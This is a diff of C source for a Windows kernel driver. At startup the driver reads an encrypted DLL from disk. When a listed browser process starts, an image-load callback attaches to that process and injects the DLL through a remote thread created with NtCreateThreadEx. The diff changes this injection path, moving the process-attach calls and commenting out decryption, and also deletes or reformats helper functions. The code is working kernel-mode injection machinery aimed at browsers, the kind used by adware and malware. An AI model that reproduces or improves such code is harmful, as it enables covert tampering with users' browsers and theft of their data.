@@ -124,7 +124,7 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
     //x64 add code
     status = MzReadFile(g_HexConfig[2], &g_pDll64, &g_iDll64);
     if (NT_SUCCESS(status)) {
-        MyDecryptFile(g_pDll64, g_iDll64, 16);
+        //MyDecryptFile(g_pDll64, g_iDll64, 16);
     }    else
         kprintf("[DriverEntry] File:%ws Error status:%x", g_HexConfig[2], status);
 
@@ -310,10 +310,7 @@ BOOLEAN GetProcessNameByObj(PEPROCESS ProcessObj, WCHAR *name)
 {
     PPEB pPEB = NULL;
     UNREFERENCED_PARAMETER(name);
-    PsGetProcessPeb == NULL ? (P_PsGetProcessPeb)GetSystemRoutineAddress(L"PsGetProcessPeb") : PsGetProcessPeb;
     pPEB = PsGetProcessPeb != NULL ? PsGetProcessPeb(ProcessObj) : NULL;
-
-    //    kprintf("[GetProcessNameByObj] pPEB:%p",pPEB);
     if (pPEB == NULL)
         return FALSE;
 #ifdef _AMD64_
@@ -1611,8 +1608,11 @@ VOID ImageNotify(PUNICODE_STRING FullImageName, HANDLE ProcessId, PIMAGE_INFO Im
                     bFindExe = FindInBrowser(exename);
                     if (bFindExe) {
 						//newWorkItem(64);
+						KAPC_STATE ApcState;
+						KeStackAttachProcess(ProcessObj, &ApcState);
 						kprintf("[ImageNotify] pid:%d x64 inject %ws by %ws",ProcessId,exename,pTempBuf);	
                        	InjectDll(ProcessObj, 64);
+						KeUnstackDetachProcess(&ApcState);
                     } 
             }
         } 
@@ -1804,14 +1804,10 @@ void InjectDll(PEPROCESS ProcessObj, int ibit)
             }
         } else {
 
-			KAPC_STATE ApcState;
+			
 
             OBJECT_ATTRIBUTES ob = {0};
             HANDLE hThread = (HANDLE)-1;
-
-
-
-//			KeStackAttachProcess(ProcessHandle, &ApcState);
             InitializeObjectAttributes(&ob, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
             status = NewNtCreateThreadEx(&hThread, 0x1FFFFF, &ob, ProcessHandle, MemloadBase, pParambase, NULL, 0, NULL, NULL, NULL);
             if (NT_SUCCESS(status)) {
@@ -1819,11 +1815,6 @@ void InjectDll(PEPROCESS ProcessObj, int ibit)
             } else {
                 kprintf("[InjectDll] NewNtCreateThreadEx fail status:%x", status);
             }
-
-//			KeUnstackDetachProcess(&ApcState);
-
-
-
         }
     HHHH:
         ZwClose(ProcessHandle);
@@ -1843,19 +1834,7 @@ NTSTATUS AppendListNode(CONST WCHAR name[], LIST_ENTRY *link, ULONG uType)
     return STATUS_SUCCESS;
 }
 
-BOOLEAN IsByInjectProc(const WCHAR *name)
-{
-    PLIST_ENTRY p;
-    BOOLEAN bret = FALSE;
-    for (p = g_ListProcess.Flink; p != &g_ListProcess.Flink; p = p->Flink) {
-        PMY_COMMAND_INFO pData = CONTAINING_RECORD(p, MY_COMMAND_INFO, Entry);
-        if (_wcsicmp(pData->exename, name) == 0) {
-            bret = TRUE;
-            break;
-        }
-    }
-    return bret;
-}
+
 
 NTSTATUS MzReadFile(LPWCH pFile, PVOID *ImageBaseAddress, PULONG ImageSize)
 {
@@ -2041,43 +2020,23 @@ VOID ReadDriverParameters(IN PUNICODE_STRING RegistryPath)
     //  If this value is not zero then somebody has already explicitly set it
     //  so don't override those settings.
     //
-
     if (0 == LoggingFlags) {
 
         //
         //  Open the desired registry key
         //
-
-        InitializeObjectAttributes(&attributes,
-                                   RegistryPath,
-                                   OBJ_CASE_INSENSITIVE,
-                                   NULL,
-                                   NULL);
-
-        status = ZwOpenKey(&driverRegKey,
-                           KEY_READ,
-                           &attributes);
-
+        InitializeObjectAttributes(&attributes,RegistryPath,OBJ_CASE_INSENSITIVE,NULL,NULL);
+        status = ZwOpenKey(&driverRegKey,KEY_READ,&attributes);
         if (!NT_SUCCESS(status)) {
 
             return;
         }
-
         //
         // Read the given value from the registry.
         //
-
         RtlInitUnicodeString(&valueName, L"DebugFlags");
-
-        status = ZwQueryValueKey(driverRegKey,
-                                 &valueName,
-                                 KeyValuePartialInformation,
-                                 buffer,
-                                 sizeof(buffer),
-                                 &resultLength);
-
+        status = ZwQueryValueKey(driverRegKey,&valueName,KeyValuePartialInformation,buffer,sizeof(buffer),&resultLength);
         if (NT_SUCCESS(status)) {
-
             LoggingFlags = *((PULONG) & (((PKEY_VALUE_PARTIAL_INFORMATION)buffer)->Data));
         }
 
@@ -2180,30 +2139,18 @@ NTSTATUS LfGetObjectName( IN CONST PVOID Object, OUT PUNICODE_STRING* ObjectName
     ULONG           ReturnLength;
     ULONG           MaxLen=0;
     if((!MmIsAddressValid(Object)) || (ObjectName == NULL)) return Status;
-
-
-
+	
     if(pPartialName->Length>512||pPartialName->Length==0) return Status;
-
-
+	
     if(pPartialName->Buffer[0]==L'\\') {
-
-//      kprintf("[LfGetObjectName] pPartialName:%wZ",pPartialName);
         return STATUS_SUCCESS;
-
     }
 
 
     ObQueryNameString( Object, (POBJECT_NAME_INFORMATION)&ReturnLength, sizeof(ULONG), &ReturnLength );
     *ObjectName = NULL;
     MaxLen=ReturnLength+pPartialName->MaximumLength+4;
-
     if (ReturnLength>512)  return Status;
-
-
-
-
-
     TmpName = (PUNICODE_STRING)kmalloc( MaxLen );
     if ( TmpName ) {
         Status = ObQueryNameString( Object, (POBJECT_NAME_INFORMATION)TmpName, ReturnLength, &ReturnLength );
@@ -2337,73 +2284,6 @@ void InitAllStr()
         }
     }
 }
-
-
-
-BOOLEAN GetRegistryObjectCompleteName(PUNICODE_STRING pRegistryPath, PUNICODE_STRING
-                                      pPartialRegistryPath, PVOID pRegistryObject)
-{
-
-    BOOLEAN foundCompleteName = FALSE;
-
-    BOOLEAN partial = FALSE;
-
-    if((!MmIsAddressValid(pRegistryObject)) || (pRegistryObject == NULL))
-
-        return FALSE;
-
-    /* Check to see if the partial name is really the complete name */
-
-    if(pPartialRegistryPath != NULL) {
-
-
-        if(pPartialRegistryPath->Buffer[0] == '\\') {
-
-            RtlCopyUnicodeString(pRegistryPath, pPartialRegistryPath);
-            partial = TRUE;
-            foundCompleteName = TRUE;
-        }
-
-    }
-
-//    if(!foundCompleteName) {
-//
-//        /* Query the object manager in the kernel for the complete name */
-//        NTSTATUS status;
-//        ULONG returnedLength;
-//        PUNICODE_STRING pObjectName = NULL;
-//        status = ObQueryNameString(pRegistryObject, (POBJECT_NAME_INFORMATION)pObjectName, 0,
-//                                   &returnedLength );
-//
-//        if(status == STATUS_INFO_LENGTH_MISMATCH) {
-//
-//
-//
-//            pObjectName = kmalloc(returnedLength);
-//            status = ObQueryNameString(pRegistryObject, (POBJECT_NAME_INFORMATION)pObjectName,
-//                                       returnedLength, &returnedLength );
-//
-//            if(NT_SUCCESS(status)) {
-//
-//                RtlCopyUnicodeString(pRegistryPath, pObjectName);
-////                RtlAppendUnicodeToString(pRegistryPath,L"\\");
-////                RtlAppendUnicodeStringToString(pRegistryPath,pPartialRegistryPath);
-//                foundCompleteName = TRUE;
-//
-//            }
-//
-//
-//            kfree(pObjectName);
-//
-//
-//
-//        }
-//
-//    }
-
-    return foundCompleteName;
-}
-
 
 
 
